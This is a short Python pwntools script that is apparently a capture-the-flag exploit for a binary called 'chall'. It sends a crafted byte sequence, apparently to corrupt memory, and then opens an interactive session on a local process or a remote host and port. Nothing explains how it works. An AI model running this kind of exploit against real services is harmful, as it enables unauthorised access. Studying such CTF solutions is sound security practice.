#!/usr/bin/python
#coding=utf-8
 
from pwn import *
 
e = ELF("../src/chall")

context.binary = e
context.log_level = "debug"

is_local = False
is_remote = False
 
if len(sys.argv) == 1:
    is_local = True
    p = process(e.path)
 
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
 
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
 
 
def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug()

for i in range(8):
    print(i)
    sla("letter:", b'\x00')

sla("letter:", b'\x92')
sla("letter:", b'\xb2')
sla("letter:", b'\xd2')
sla("letter:", b'\xf2')
sla("letter:", b'\x12')
sla("letter:", b'\x32')

for i in range(6):
    for j in range(6):
        sla("letter:", p8(0x20 * (i+1)))

for i in range(5):
    sla("letter:", p8(0xe0))
    sla("letter:", p8(0x0))

sla("letter:", p8(0xe0))

for i in range(39):
    print(i)
    sla("letter:", b'(');

p.interactive()
